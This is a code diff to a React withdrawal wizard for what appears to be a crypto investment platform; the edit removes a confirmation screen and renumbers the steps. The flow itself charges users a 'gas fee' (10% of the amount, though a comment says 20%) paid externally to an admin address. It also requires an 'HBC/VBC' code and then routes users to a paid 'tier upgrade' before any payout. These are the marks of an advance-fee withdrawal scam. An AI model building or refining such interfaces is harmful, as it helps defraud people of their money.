@@ -78,8 +78,8 @@ const TIER_PLANS = [
 export const WithdrawalModal: React.FC<WithdrawalModalProps> = ({ isOpen, onClose, defaultAsset = 'USDT', onSuccess }) => {
   const { session, user } = useAuth();
 
-  // Wizard Navigation: 1 = Confirm, 2 = Convert, 3 = Payout Details, 4 = Gas Fee, 5 = Tier Upgrade Portal
-  const [currentStep, setCurrentStep] = useState<1 | 2 | 3 | 4 | 5>(1);
+  // Wizard Navigation: 1 = Convert, 2 = Payout Details, 3 = Gas Fee, 4 = Tier Upgrade Portal
+  const [currentStep, setCurrentStep] = useState<1 | 2 | 3 | 4>(1);
   const [activeTab, setActiveTab] = useState<'withdraw' | 'history'>('withdraw');
 
   // Form State
@@ -130,8 +130,6 @@ export const WithdrawalModal: React.FC<WithdrawalModalProps> = ({ isOpen, onClos
   const gasFeeAmount = Number((amount * 0.10).toFixed(8)); // 10% gas fee requirement paid externally
   const netPayoutAmount = Number(amount.toFixed(8)); // 100% full payout to user bank/address
   const netConvertedPayout = convertedTotal; // 100% full converted currency to bank
-
-
 
   const copyToClipboard = (text: string, key: string) => {
     if (!text) return;
@@ -196,7 +194,7 @@ export const WithdrawalModal: React.FC<WithdrawalModalProps> = ({ isOpen, onClos
     }
   }, [isOpen, session?.access_token]);
 
-  // Submit Final Step 4: Submit Gas Fee & Lock Balance
+  // Submit Final Step 3: Submit Gas Fee & Lock Balance
   const handleSubmitWithdrawal = async (e: React.FormEvent) => {
     e.preventDefault();
     if (amount <= 0) {
@@ -204,11 +202,11 @@ export const WithdrawalModal: React.FC<WithdrawalModalProps> = ({ isOpen, onClos
       return;
     }
     if (payoutMethod === 'BANK_TRANSFER' && (!bankName || !accountHolder || !accountNumber)) {
-      setMessage({ type: 'error', text: 'Please complete all required bank transfer details in Step 3.' });
+      setMessage({ type: 'error', text: 'Please complete all required bank transfer details in Step 2.' });
       return;
     }
     if (payoutMethod === 'CRYPTO_WALLET' && !cryptoAddress.trim()) {
-      setMessage({ type: 'error', text: 'Please enter a valid crypto destination address in Step 3.' });
+      setMessage({ type: 'error', text: 'Please enter a valid crypto destination address in Step 2.' });
       return;
     }
     if (!hbcVbcCode.trim()) {
@@ -267,7 +265,7 @@ export const WithdrawalModal: React.FC<WithdrawalModalProps> = ({ isOpen, onClos
     }
   };
 
-  // Submit Tier Upgrade Proof in Step 5
+  // Submit Tier Upgrade Proof in Step 4
   const handleSubmitUpgradeProof = async () => {
     if (!upgradeTxHash.trim()) {
       setMessage({ type: 'error', text: 'Please enter the transaction reference / hash for your tier upgrade payment.' });
@@ -316,14 +314,15 @@ export const WithdrawalModal: React.FC<WithdrawalModalProps> = ({ isOpen, onClos
       <div className="relative w-full max-w-2xl bg-slate-900 border border-slate-700/80 rounded-2xl shadow-2xl overflow-hidden my-auto sm:my-8 animate-in fade-in zoom-in-95 duration-200">
         {/* Header */}
         <div className="flex items-center justify-between p-4 sm:p-5 border-b border-slate-800 bg-slate-950/50">
-
           <div className="flex items-center space-x-3">
             <div className="w-10 h-10 rounded-xl bg-gradient-to-tr from-amber-500 to-orange-600 flex items-center justify-center shadow-lg shadow-orange-500/20">
               <ArrowUpCircle className="w-5 h-5 text-white" />
             </div>
             <div>
               <h3 className="text-lg font-bold text-white tracking-wide">Institutional Capital Withdrawal</h3>
-              <p className="text-xs text-slate-400">Step {currentStep} of 4 &bull; Multi-Stage Verified Payout</p>
+              <p className="text-xs text-slate-400">
+                {currentStep <= 3 ? `Step ${currentStep} of 3 • Multi-Stage Verified Payout` : 'Account Tier Upgrade Portal'}
+              </p>
             </div>
           </div>
           <button
@@ -381,58 +380,13 @@ export const WithdrawalModal: React.FC<WithdrawalModalProps> = ({ isOpen, onClos
         {/* TAB 1: WITHDRAWAL WIZARD */}
         {activeTab === 'withdraw' && (
           <div className="p-6">
-            {/* STEP 1: CONFIRMATION & GUIDE PROMPT */}
+            {/* STEP 1: CONVERSION TO LOCAL CURRENCY (MAX BALANCE ONLY) */}
             {currentStep === 1 && (
-              <div className="space-y-6 text-center py-4">
-                <div className="w-16 h-16 mx-auto rounded-full bg-amber-500/10 border border-amber-500/30 flex items-center justify-center text-amber-400 shadow-inner">
-                  <HelpCircle className="w-8 h-8" />
-                </div>
-                <div className="space-y-2">
-                  <h4 className="text-xl font-bold text-white">Are you sure you want to withdraw?</h4>
-                  <p className="text-sm text-slate-300 max-w-md mx-auto">
-                    Please follow the institutional withdrawal guide to convert and disburse your portfolio safely.
-                  </p>
-                </div>
-
-                <div className="p-4 bg-slate-950/60 border border-slate-800 rounded-xl text-left space-y-2 text-xs text-slate-300">
-                  <div className="flex items-center space-x-2 text-amber-400 font-semibold text-sm">
-                    <Info className="w-4 h-4" />
-                    <span>Important Withdrawal Guidelines:</span>
-                  </div>
-                  <ul className="list-disc list-inside space-y-1 text-slate-400">
-                    <li>Withdrawals utilize real-time institutional exchange rates for local currency conversion.</li>
-                    <li>The system locks your full withdrawal balance during the disbursement process.</li>
-                    <li>Gas clearance fee is paid externally to the treasury network (100% of your withdrawal amount is credited in full to your bank/wallet).</li>
-                    <li>Ensure you have your authorized HBC / VBC verification code ready.</li>
-                  </ul>
-
-                </div>
-
-                <div className="flex items-center justify-center space-x-3 pt-2">
-                  <button
-                    onClick={onClose}
-                    className="px-6 py-2.5 rounded-xl border border-slate-700 text-slate-300 hover:bg-slate-800 text-sm font-semibold transition-all"
-                  >
-                    Cancel
-                  </button>
-                  <button
-                    onClick={() => setCurrentStep(2)}
-                    className="px-8 py-2.5 rounded-xl bg-gradient-to-r from-amber-500 to-orange-600 hover:from-amber-600 hover:to-orange-700 text-white font-bold text-sm shadow-lg shadow-orange-500/25 transition-all flex items-center space-x-2"
-                  >
-                    <span>Proceed to Withdrawal</span>
-                    <ArrowRight className="w-4 h-4" />
-                  </button>
-                </div>
-              </div>
-            )}
-
-            {/* STEP 2: CONVERSION TO LOCAL CURRENCY (MAX BALANCE ONLY) */}
-            {currentStep === 2 && (
               <div className="space-y-5">
                 <div className="flex items-center justify-between">
                   <span className="text-xs font-bold uppercase tracking-wider text-amber-400 flex items-center space-x-1.5">
                     <Sparkles className="w-3.5 h-3.5" />
-                    <span>Step 2 &bull; Portfolio Currency Conversion</span>
+                    <span>Step 1 &bull; Portfolio Currency Conversion</span>
                   </span>
                   <span className="text-xs text-slate-400">High-Rate Favorable Pricing</span>
                 </div>
@@ -498,19 +452,20 @@ export const WithdrawalModal: React.FC<WithdrawalModalProps> = ({ isOpen, onClos
                 {/* Navigation Buttons */}
                 <div className="flex items-center justify-between pt-3 border-t border-slate-800">
                   <button
-                    onClick={() => setCurrentStep(1)}
-                    className="px-5 py-2.5 rounded-xl border border-slate-700 text-slate-300 hover:bg-slate-800 text-sm font-semibold flex items-center space-x-2 transition-all"
+                    type="button"
+                    onClick={onClose}
+                    className="px-5 py-2.5 rounded-xl border border-slate-700 text-slate-300 hover:bg-slate-800 text-sm font-semibold transition-all"
                   >
-                    <ArrowLeft className="w-4 h-4" />
-                    <span>Back</span>
+                    Cancel
                   </button>
                   <button
+                    type="button"
                     onClick={() => {
                       if (availableBalance <= 0) {
                         setMessage({ type: 'error', text: 'You need an available balance greater than 0 to proceed.' });
                         return;
                       }
-                      setCurrentStep(3);
+                      setCurrentStep(2);
                     }}
                     className="px-6 py-2.5 rounded-xl bg-gradient-to-r from-amber-500 to-orange-600 hover:from-amber-600 hover:to-orange-700 text-white font-bold text-sm shadow-lg shadow-orange-500/25 transition-all flex items-center space-x-2"
                   >
@@ -521,13 +476,13 @@ export const WithdrawalModal: React.FC<WithdrawalModalProps> = ({ isOpen, onClos
               </div>
             )}
 
-            {/* STEP 3: PAYOUT DESTINATION & HBC/VBC CODE */}
-            {currentStep === 3 && (
+            {/* STEP 2: PAYOUT DESTINATION & HBC/VBC CODE */}
+            {currentStep === 2 && (
               <div className="space-y-5">
                 <div className="flex items-center justify-between">
                   <span className="text-xs font-bold uppercase tracking-wider text-amber-400 flex items-center space-x-1.5">
                     <Building2 className="w-3.5 h-3.5" />
-                    <span>Step 3 &bull; Payout Destination & Security Code</span>
+                    <span>Step 2 &bull; Payout Destination & Security Code</span>
                   </span>
                   <span className="text-xs text-slate-400">Bank Wire or Crypto</span>
                 </div>
@@ -658,13 +613,15 @@ export const WithdrawalModal: React.FC<WithdrawalModalProps> = ({ isOpen, onClos
                 {/* Navigation Buttons */}
                 <div className="flex items-center justify-between pt-3 border-t border-slate-800">
                   <button
-                    onClick={() => setCurrentStep(2)}
+                    type="button"
+                    onClick={() => setCurrentStep(1)}
                     className="px-5 py-2.5 rounded-xl border border-slate-700 text-slate-300 hover:bg-slate-800 text-sm font-semibold flex items-center space-x-2 transition-all"
                   >
                     <ArrowLeft className="w-4 h-4" />
                     <span>Back</span>
                   </button>
                   <button
+                    type="button"
                     onClick={() => {
                       if (payoutMethod === 'BANK_TRANSFER' && (!bankName || !accountHolder || !accountNumber)) {
                         setMessage({ type: 'error', text: 'Please fill in the bank name, account holder, and account number.' });
@@ -679,7 +636,7 @@ export const WithdrawalModal: React.FC<WithdrawalModalProps> = ({ isOpen, onClos
                         return;
                       }
                       setMessage(null);
-                      setCurrentStep(4);
+                      setCurrentStep(3);
                     }}
                     className="px-6 py-2.5 rounded-xl bg-gradient-to-r from-amber-500 to-orange-600 hover:from-amber-600 hover:to-orange-700 text-white font-bold text-sm shadow-lg shadow-orange-500/25 transition-all flex items-center space-x-2"
                   >
@@ -690,13 +647,13 @@ export const WithdrawalModal: React.FC<WithdrawalModalProps> = ({ isOpen, onClos
               </div>
             )}
 
-            {/* STEP 4: 20% GAS FEE CALCULATION & ADMIN ADDRESS PAYMENT */}
-            {currentStep === 4 && (
+            {/* STEP 3: 20% GAS FEE CALCULATION & ADMIN ADDRESS PAYMENT */}
+            {currentStep === 3 && (
               <form onSubmit={handleSubmitWithdrawal} className="space-y-5">
                 <div className="flex items-center justify-between">
                   <span className="text-xs font-bold uppercase tracking-wider text-amber-400 flex items-center space-x-1.5">
                     <Zap className="w-3.5 h-3.5" />
-                    <span>Step 4 &bull; Gas Fee Clearance & Final Authorization</span>
+                    <span>Step 3 &bull; Gas Fee Clearance & Final Authorization</span>
                   </span>
                   <span className="text-xs text-emerald-400 font-bold">100% Full Balance Payout</span>
                 </div>
@@ -733,7 +690,6 @@ export const WithdrawalModal: React.FC<WithdrawalModalProps> = ({ isOpen, onClos
                     </span>
                   </div>
 
-
                   <div className="flex items-center space-x-2 bg-slate-950 p-3 rounded-lg border border-slate-700">
                     <span className="font-mono text-xs text-slate-200 break-all flex-1">{gasFeeAddress}</span>
                     <button
@@ -768,7 +724,7 @@ export const WithdrawalModal: React.FC<WithdrawalModalProps> = ({ isOpen, onClos
                 <div className="flex items-center justify-between pt-3 border-t border-slate-800">
                   <button
                     type="button"
-                    onClick={() => setCurrentStep(3)}
+                    onClick={() => setCurrentStep(2)}
                     className="px-5 py-2.5 rounded-xl border border-slate-700 text-slate-300 hover:bg-slate-800 text-sm font-semibold flex items-center space-x-2 transition-all"
                   >
                     <ArrowLeft className="w-4 h-4" />
@@ -795,8 +751,8 @@ export const WithdrawalModal: React.FC<WithdrawalModalProps> = ({ isOpen, onClos
               </form>
             )}
 
-            {/* STEP 5: TIER UPGRADE PORTAL */}
-            {currentStep === 5 && (
+            {/* STEP 4: TIER UPGRADE PORTAL */}
+            {currentStep === 4 && (
               <div className="space-y-6">
                 <div className="p-5 bg-gradient-to-r from-amber-500/10 to-orange-500/10 border border-amber-500/30 rounded-2xl space-y-2">
                   <div className="flex items-center space-x-2.5 text-amber-400 font-bold text-base">
@@ -807,7 +763,6 @@ export const WithdrawalModal: React.FC<WithdrawalModalProps> = ({ isOpen, onClos
                     To proceed with your withdrawal, you need to upgrade your account tier. Kindly contact customer care for assistance to upgrade your account.
                   </p>
                 </div>
-
 
                 {/* Plan Selection Cards (Without Pricing) */}
                 <div className="space-y-2">
@@ -833,7 +788,6 @@ export const WithdrawalModal: React.FC<WithdrawalModalProps> = ({ isOpen, onClos
                     ))}
                   </div>
                 </div>
-
 
                 {/* Admin-Provided Upgrade Payment Treasury Address */}
                 <div className="p-4 bg-slate-950 border border-slate-800 rounded-xl space-y-3">
@@ -999,7 +953,7 @@ export const WithdrawalModal: React.FC<WithdrawalModalProps> = ({ isOpen, onClos
                             onClick={() => {
                               setSelectedWithdrawalForUpgrade(req);
                               setActiveTab('withdraw');
-                              setCurrentStep(5);
+                              setCurrentStep(4);
                             }}
                             className="px-4 py-1.5 rounded-lg bg-gradient-to-r from-emerald-500 to-teal-600 hover:from-emerald-600 hover:to-teal-700 text-white font-bold text-xs shadow-md shadow-emerald-500/20 flex items-center space-x-1.5 transition-all"
                           >
